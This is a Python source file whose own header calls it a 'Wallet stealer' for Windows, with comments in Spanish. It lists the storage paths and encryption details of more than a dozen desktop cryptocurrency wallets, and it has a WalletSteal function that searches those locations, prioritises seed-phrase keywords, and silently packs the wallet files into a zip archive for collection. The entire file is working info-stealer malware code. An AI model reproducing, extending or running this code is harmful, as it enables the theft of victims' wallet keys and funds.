# language: Python 3, file: wallets.py, target: Windows 10/11
# Wallet stealer — wallets de escritorio locales
# cubre: Exodus, Atomic Wallet, Electrum, Jaxx Liberty, Coinomi, Wasabi, Sparrow, Bitcoin Core

import os
import shutil
import zipfile

LOCAL   = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
USER    = os.getenv("USERPROFILE")

WALLET_PATHS = [
    # ── Exodus ────────────────────────────────────────────────────────────────
    # almacena seed phrase cifrada en passphrase.json + assets en exodus.wallet
    {
        "name": "Exodus",
        "paths": [
            os.path.join(ROAMING, "Exodus", "exodus.wallet"),
        ],
        "extensions": [".wallet", ".json", ".txt"],
        "notes": "seed phrase in passphrase.json, encrypted with user password"
    },
    # ── Atomic Wallet ─────────────────────────────────────────────────────────
    # leveldb en Local Storage — contiene seed cifrada en IndexedDB
    {
        "name": "Atomic Wallet",
        "paths": [
            os.path.join(LOCAL, "atomic", "Local Storage", "leveldb"),
            os.path.join(LOCAL, "atomic wallet", "Local Storage", "leveldb"),
        ],
        "extensions": [".ldb", ".log"],
        "notes": "seed phrase encrypted in leveldb, AES-256 with user password"
    },
    # ── Electrum ──────────────────────────────────────────────────────────────
    # wallets en %APPDATA%\Electrum\wallets — archivos JSON con seed cifrada
    {
        "name": "Electrum",
        "paths": [
            os.path.join(ROAMING, "Electrum", "wallets"),
        ],
        "extensions": [],  # sin extensión o cualquier archivo
        "notes": "wallet files contain encrypted seed (AES-256-CBC with user password)"
    },
    # ── Electrum-LTC ──────────────────────────────────────────────────────────
    {
        "name": "Electrum-LTC",
        "paths": [
            os.path.join(ROAMING, "Electrum-LTC", "wallets"),
        ],
        "extensions": [],
        "notes": "same format as Electrum, Litecoin variant"
    },
    # ── Jaxx Liberty ──────────────────────────────────────────────────────────
    {
        "name": "Jaxx Liberty",
        "paths": [
            os.path.join(LOCAL, "jaxx liberty", "Local Storage", "leveldb"),
        ],
        "extensions": [".ldb", ".log"],
        "notes": "mnemonic stored in leveldb, look for 'mnemonic' key"
    },
    # ── Wasabi Wallet ─────────────────────────────────────────────────────────
    {
        "name": "Wasabi Wallet",
        "paths": [
            os.path.join(ROAMING, "WalletWasabi", "Client", "Wallets"),
        ],
        "extensions": [".json"],
        "notes": "EncryptedSecret field in JSON, PBKDF2 + AES-256-CBC"
    },
    # ── Sparrow Wallet ────────────────────────────────────────────────────────
    {
        "name": "Sparrow Wallet",
        "paths": [
            os.path.join(ROAMING, "Sparrow", "wallets"),
        ],
        "extensions": [".sparrow"],
        "notes": "encrypted SQLite, password-derived key"
    },
    # ── Bitcoin Core ──────────────────────────────────────────────────────────
    {
        "name": "Bitcoin Core",
        "paths": [
            os.path.join(ROAMING, "Bitcoin", "wallets"),
            os.path.join(ROAMING, "Bitcoin", "wallet.dat"),
        ],
        "extensions": [".dat"],
        "notes": "BerkeleyDB wallet.dat, may be unencrypted if no passphrase set"
    },
    # ── Litecoin Core ─────────────────────────────────────────────────────────
    {
        "name": "Litecoin Core",
        "paths": [
            os.path.join(ROAMING, "Litecoin", "wallet.dat"),
        ],
        "extensions": [".dat"],
        "notes": "BerkeleyDB, same structure as Bitcoin Core"
    },
    # ── Ethereum (geth keystore) ──────────────────────────────────────────────
    {
        "name": "geth Keystore",
        "paths": [
            os.path.join(ROAMING, "Ethereum", "keystore"),
            os.path.join(LOCAL,   "Ethereum", "keystore"),
        ],
        "extensions": [],
        "notes": "UTC--* files, JSON keystore encrypted with user password (scrypt/PBKDF2)"
    },
    # ── Coinomi ───────────────────────────────────────────────────────────────
    {
        "name": "Coinomi",
        "paths": [
            os.path.join(LOCAL, "Coinomi", "Coinomi", "wallets"),
        ],
        "extensions": [".wallet"],
        "notes": "AES-256-CBC encrypted, password-derived"
    },
    # ── Monero GUI ────────────────────────────────────────────────────────────
    {
        "name": "Monero GUI",
        "paths": [
            os.path.join(ROAMING, "monero-project", "monero-wallet-gui"),
            os.path.join(USER, "Documents", "Monero", "wallets"),
        ],
        "extensions": [".keys", ""],
        "notes": ".keys file contains encrypted spend/view keys"
    },
    # ── Trust Wallet (Desktop) ────────────────────────────────────────────────
    {
        "name": "Trust Wallet",
        "paths": [
            os.path.join(LOCAL, "trust wallet", "Local Storage", "leveldb"),
        ],
        "extensions": [".ldb", ".log"],
        "notes": "leveldb, seed in encrypted form"
    },
]

# strings que indican seed phrase en archivos de texto / JSON
SEED_INDICATORS = [
    b"mnemonic", b"seed_phrase", b"seedPhrase", b"secret_seed",
    b"recovery_phrase", b"backup_phrase", b"wallet_seed",
    b'"seed"', b"privateKey", b"private_key", b"spendKey",
    b"EncryptedSecret", b"encryptedMnemonic", b"encryptedSeed",
]


def _contains_seed_hint(data: bytes) -> bool:
    low = data.lower()
    return any(ind.lower() in low for ind in SEED_INDICATORS)


def _add_to_zip(zip_file, src_path: str, arc_prefix: str, exts: list[str]):
    """
    Agrega archivos de src_path al zip bajo arc_prefix.
    Si exts está vacío, agrega todo. Prioriza archivos con hints de seed.
    """
    if os.path.isfile(src_path):
        # path directo a un archivo
        try:
            arc = os.path.join(arc_prefix, os.path.basename(src_path))
            zip_file.write(src_path, arc)
            return 1
        except Exception:
            return 0

    if not os.path.isdir(src_path):
        return 0

    count = 0
    for root, _, files in os.walk(src_path):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                # filtrar por extensión si se especificó
                if exts:
                    _, ext = os.path.splitext(fname)
                    if ext not in exts and fname not in ["CURRENT", "MANIFEST-000001"]:
                        continue

                arcname = os.path.join(
                    arc_prefix,
                    os.path.relpath(fpath, src_path)
                )
                zip_file.write(fpath, arcname)
                count += 1
            except Exception:
                pass
    return count


def WalletSteal(zip_file) -> dict:
    """
    Sweep de wallets locales.
    Retorna dict {wallet_name: file_count}.
    """
    results = {}
    info_lines = []

    for wallet in WALLET_PATHS:
        name  = wallet["name"]
        paths = wallet["paths"]
        exts  = wallet["extensions"]
        notes = wallet["notes"]

        found = False
        total = 0

        for wpath in paths:
            if not os.path.exists(wpath):
                continue
            found = True
            arc_prefix = os.path.join("Wallets", name)
            n = _add_to_zip(zip_file, wpath, arc_prefix, exts)
            total += n

        if found:
            results[name] = total
            info_lines.append(
                f"[+] {name}\n"
                f"    Files grabbed : {total}\n"
                f"    Note          : {notes}\n"
            )
        # si no encontrado: skip silencioso

    if not info_lines:
        zip_file.writestr("Wallets/README.txt", "No local wallets found.")
    else:
        summary = "\n".join(info_lines)
        summary += f"\n\nTotal wallets found: {len(results)}"
        zip_file.writestr("Wallets/README.txt", summary)

    return results
